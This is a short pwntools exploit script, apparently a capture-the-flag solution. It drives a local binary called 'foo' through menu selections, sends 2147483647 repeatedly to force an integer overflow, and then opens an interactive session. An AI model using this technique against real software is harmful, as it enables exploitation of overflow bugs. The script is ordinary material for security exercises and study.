
from pwn import *
import struct


p = process('./foo')


for _ in range(120):
    p.recvregex(b'$')
    p.sendline(b'2')
    p.recvregex(b'$')
    p.sendline(b'1')
    p.recvline(b'$')
    p.sendline(b'2147483647')
p.recvregex(b'$')
p.sendline(b'1')

p.recvregex(b'$')
p.sendline(b'2')
p.recvregex(b'$')
p.sendline(b'2')
p.recvline()
p.sendline(b'1')



p.interactive()
